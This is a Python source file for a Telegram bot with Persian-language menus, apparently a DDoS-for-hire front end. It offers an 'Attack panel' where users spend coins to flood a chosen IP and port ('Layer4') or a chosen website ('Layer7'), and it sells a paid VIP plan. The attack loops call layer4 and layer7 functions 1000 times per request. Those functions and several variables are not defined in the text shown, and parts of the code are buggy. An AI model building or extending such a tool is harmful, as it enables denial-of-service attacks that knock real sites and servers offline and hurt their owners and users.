from telethon import TelegramClient
from telethon import events
from os import path
import socket
from random import randint

@client.on(events.NewMessage)
async def my_event_handler(event):
    if message[1:6] == "start" or message[1:6] == "Start" or message == "↬ بازگشت":
    	if path.isfile('data/'+str(chat_id)) == False:
    	   if "1" in message[7:] or "2" in message[7:] or "3" in message[7:] or "4" in message[7:] or "5" in message[7:] or "6" in message[7:] or "7" in message[7:] or "9" in message[7:]:
    	       referral = message[7:]
    	       add_coin(referral)
    	       await client.send_message(int(referral), '♱ 𝙰 𝚞𝚜𝚎𝚛 𝚎𝚗𝚝𝚎𝚛𝚎𝚍 𝚝𝚑𝚎 𝚛𝚘𝚋𝚘𝚝 𝚝𝚑𝚛𝚘𝚞𝚐𝚑 𝚢𝚘𝚞𝚛 𝚕𝚒𝚗𝚔 𝚊𝚗𝚍 𝚢𝚘𝚞 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 １ 𝚌𝚘𝚒𝚗.')
    	   open('data/'+str(chat_id), "w").write("0")
    	coin = open('data/'+str(chat_id), 'r').read()
    	await event.reply('''⇜ برای استفاده از ربات یکی از گزینه های زیر را انتخاب کنید :

➣ 𝐶𝑜𝑑𝑒𝑑 𝑏𝑦 𝒑𝒉𝒐𝒆𝒏𝒊𝒙''', buttons=[[Button.text('⇢ Attack panel ⇠', resize=True, single_use=False)], [Button.text('✞ Check host ✞', resize=True, single_use=False)], [Button.text('› Account ‹', resize=True, single_use=False), Button.text('† Referral †', resize=True, single_use=False)]])
# Attack panel
    if message == "⇢ Attack panel ⇠":
    	await event.reply('''⇜ وارد بخش دیداس شدید
یکی از گزینه های زیر را انتخاب کنید : ''',  buttons=[[Button.text('Layer7', resize=True, single_use=False)], [Button.text('Layer4', resize=True, single_use=False)], [Button.text('↬ بازگشت', resize=True, single_use=False)]])

    if message == 'Layer7':
    	await event.reply('''← لطفا آدرس سایت موردنظر را برای دیداس لایه ۷ با دستور /layer7 وارد کنید

مثال : 

/layer7 http://example.com''', buttons=[Button.text('↬ بازگشت', resize=True, single_use=False)])

    if message == 'Layer4':
    	await event.reply('''← لطفا آیپی و پورت سایت یا سرور موردنظر را برای دیداس لایه ۴ با دستور /layer4 وارد کنید

مثال : 

/layer4 163.98.120.3:8000''', buttons=[Button.text('↬ بازگشت', resize=True, single_use=False)])
    if message[1:7] == "layer4":
    	if open('data/'+str(chat_id), 'r').read() == "0":
    	    await event.reply('✘ 𝑰𝒏𝒗𝒆𝒏𝒕𝒐𝒓𝒚 𝒊𝒔 𝒏𝒐𝒕 𝒆𝒏𝒐𝒖𝒈𝒉')
    	elif open('data/'+str(chat_id), 'r').read() != "0" or message[8:].split(':')[0] not in black_list:
    	    if ':' in message[8:]:
    	       target_ip = message[8:].split(':')[0]
    	       target_port = message[8:].split(':')[1]
    	    elif ':' not in message[8:]:
    	       target_ip = message[8:]
    	       target_port = '80'
    	    deduct_coin(str(chat_id))
    	    req_id = randint(10000, 999999)
    	    await client.send_message(admin, '''♰ 𝐍𝐞𝐰 𝐫𝐞𝐪𝐮𝐞𝐬𝐭
╼┅┅━━━━━━━━━━┅┅╾
✛ 𝚃𝚊𝚛𝚐𝚎𝚝 𝚒𝚙 : '''+target_ip+'''
✛ 𝙿𝚘𝚛𝚝 : '''+target_port+'''
✛ 𝚄𝚜𝚎𝚛 𝚒𝚍 : '''+str(chat_id)+'''
✛ 𝚁𝚎𝚚𝚞𝚎𝚜𝚝 𝚒𝚍 : '''+str(req_id)+'''
╼┅┅━━━━━━━━━━┅┅╾''')
    	    await event.reply('''♰ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝...
╼┅┅━━━━━━━━━━┅┅╾
✛ 𝚃𝚊𝚛𝚐𝚎𝚝 𝚒𝚙 : '''+target_ip+'''
✛ 𝙿𝚘𝚛𝚝 : '''+target_port+'''
✛ 𝚁𝚎𝚚𝚞𝚎𝚜𝚝 𝚒𝚍 : '''+str(req_id)+'''
╼┅┅━━━━━━━━━━┅┅╾
➣ 𝐶𝑜𝑑𝑒𝑑 𝑏𝑦 𝒑𝒉𝒐𝒆𝒏𝒊𝒙''')
    	    cnt = 1
    	    while cnt <= 1000:
    	               layer4(target_ip, target_port)
    	               cnt += 1
    	    await event.reply('1000 𝙿𝚊𝚌𝚔𝚎𝚝 𝚜𝚎𝚗𝚝 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢.')
    	elif message[8:].split(':')[0] in black_list:
    	    await event.reply('✘ 𝑻𝒉𝒆 𝒔𝒊𝒕𝒆 𝒊𝒔 𝒐𝒇𝒇 𝒐𝒓 𝒊𝒔 𝒐𝒏 𝒕𝒉𝒆 𝒃𝒍𝒂𝒄𝒌𝒍𝒊𝒔𝒕.')
    if message[1:7] == "layer7":
    	if open('data/'+str(chat_id), 'r').read() == "0":
    	    await event.reply('✘ 𝑰𝒏𝒗𝒆𝒏𝒕𝒐𝒓𝒚 𝒊𝒔 𝒏𝒐𝒕 𝒆𝒏𝒐𝒖𝒈𝒉')
    	elif open('data/'+str(chat_id), 'r').read() != "0" or message[8:] not in black_list:
    	    target_url = message[8:]
    	    target_url = target_url.replace('http://', '')
    	    target_url = target_url.replace('https://', '')
    	    target_url = target_url.replace('www.', '')
    	    deduct_coin(str(chat_id))
    	    req_id = randint(10000, 999999)
    	    await client.send_message(admin, '''♰ 𝐍𝐞𝐰 𝐫𝐞𝐪𝐮𝐞𝐬𝐭
╼┅┅━━━━━━━━━━┅┅╾
✛ 𝚃𝚊𝚛𝚐𝚎𝚝 𝚒𝚙 : '''+target_url+'''
✛ 𝚄𝚜𝚎𝚛 𝚒𝚍 : '''+str(chat_id)+'''
✛ 𝚁𝚎𝚚𝚞𝚎𝚜𝚝 𝚒𝚍 : '''+str(req_id)+'''
╼┅┅━━━━━━━━━━┅┅╾''')
    	    await event.reply('''♰ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝...
╼┅┅━━━━━━━━━━┅┅╾
✛ 𝚃𝚊𝚛𝚐𝚎𝚝 𝚞𝚛𝚕 : '''+target_url+'''
✛ 𝚁𝚎𝚚𝚞𝚎𝚜𝚝 𝚒𝚍 : '''+str(req_id)+'''
╼┅┅━━━━━━━━━━┅┅╾
➣ 𝐶𝑜𝑑𝑒𝑑 𝑏𝑦 𝒑𝒉𝒐𝒆𝒏𝒊𝒙''')
    	    cnt = 1
    	    while cnt <= 1000:
    	               layer7(target_url)
    	               cnt += 1
    	    await event.reply('1000 𝙿𝚊𝚌𝚔𝚎𝚝 𝚜𝚎𝚗𝚝 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢.')
    	elif message[8:] in black_list:
    	    await event.reply('✘ 𝑻𝒉𝒆 𝒔𝒊𝒕𝒆 𝒊𝒔 𝒐𝒇𝒇 𝒐𝒓 𝒊𝒔 𝒐𝒏 𝒕𝒉𝒆 𝒃𝒍𝒂𝒄𝒌𝒍𝒊𝒔𝒕.')

    if message == "› Account ‹":
    	await event.reply('''→ 𝙲𝚑𝚊𝚝 𝚒𝚍 : '''+str(chat_id)+'''
→ 𝙲𝚘𝚒𝚗 : '''+open('data/'+str(chat_id), 'r').read()+'''
→ 𝙿𝚕𝚊𝚗 : Free''', buttons=[Button.url('⇢ buy vip plan ⇠', 'https://t.me/DR_PH03NIX')])
    if message == "† Referral †":
    	await event.reply('''♱ 𝚈𝚘𝚞𝚛 𝚛𝚎𝚏𝚎𝚛𝚛𝚊𝚕 𝚕𝚒𝚗𝚔 : https://t.me/'''+bot_username+'''?start='''+str(chat_id)+'''

➣ 𝐶𝑜𝑑𝑒𝑑 𝑏𝑦 𝒑𝒉𝒐𝒆𝒏𝒊𝒙''')
    if message == '✞ Check host ✞':
    	await event.reply('''← لطفا لینک سایت را حتما با http یا https و با دستور /check وارد کنید.

مثال : 

/check http://google.com''', buttons=[Button.text('↬ بازگشت', resize=True, single_use=False)])
    if message[1:6] == "check":
    	if open('data/'+str(chat_id), 'r').read() == "0":
    	    await event.reply('✘ 𝑰𝒏𝒗𝒆𝒏𝒕𝒐𝒓𝒚 𝒊𝒔 𝒏𝒐𝒕 𝒆𝒏𝒐𝒖𝒈𝒉')
    	elif open('data/'+str(chat_id), 'r').read() != "0":
    	    check_link = message[7:]
    	    if 'http' in check_link or 'https' in check_link or '.ir' in message or '.com' in message or message not in black_list:
    	        now = datetime.now()
    	        await client.send_message(entity=chat_id, message='''
╔ 𝑯𝒐𝒔𝒕 : '''+check_link+'''
╠ 𝑻𝒊𝒎𝒆 : '''+str(now.hour)+''':'''+str(now.minute)+'''
╚ 𝑪𝒐??𝒆𝒅 𝒃𝒚 𝒅𝒓.𝒑𝒉𝒐𝒆𝒏𝒊𝒙''', file='https://api.codebazan.ir/webshot/?text=1000&domain=http://check-host.net/check-http?host='+check_link)
    	        deduct_coin(str(chat_id))
    	    else:
    	        await event.reply('✘ 𝑻𝒉𝒆 𝒍𝒊𝒏𝒌 𝒊𝒔 𝒊𝒏𝒄𝒐𝒓𝒓𝒆𝒄𝒕')
    if message == "/panel" and event.sender_id == admin:
    	await event.reply('''⇜ وارد بخش مدیریت شدید.
◮ لیست دستورات : 


♰ ارسال همگانی 
/s2all متن پیام
┈┅┅━━━━━━✦━━━━━┅┅┈
♰ آمار ربات
/members
┈┅┅━━━━━━✦━━━━━┅┅┈
♰ افزایش سکه
/add آیدی عددی کاربر
┈┅┅━━━━━━✦━━━━━┅┅┈
♰ کسر سکه
/deduct آیدی عددی کاربر
┈┅┅━━━━━━✦━━━━━┅┅┈''', buttons=[Button.text('↬ بازگشت', resize=True, single_use=False)])
    if message == "/members" and event.sender_id == admin:
    	dialogs = await client.get_dialogs()
    	i = 0
    	for chat in dialogs:
    	      i+1
    	await event.reply('♱ 𝑴𝒆𝒎𝒃𝒆𝒓𝒔 : '+str(i))
    if message[1:6] == "s2all" and event.sender_id == admin:
    	await event.reply('Sending message to all members...')
    	text = message[7:]
    	dialogs = await client.get_dialogs()
    	for chat in dialogs:
    	      await client.send_message(entity=chat.id, message=text)
    	await event.reply('Message sent successfully.')
    if message [1:4] == "add" and event.sender_id == admin:
    	id = message[5:]
    	add_coin(id)
    	await event.reply('1 coin was added')
    if message [1:7] == "deduct" and event.sender_id == admin:
    	id = message[8:]
    	deduct_coin(id)
    	await event.reply('1 coin was deducted')
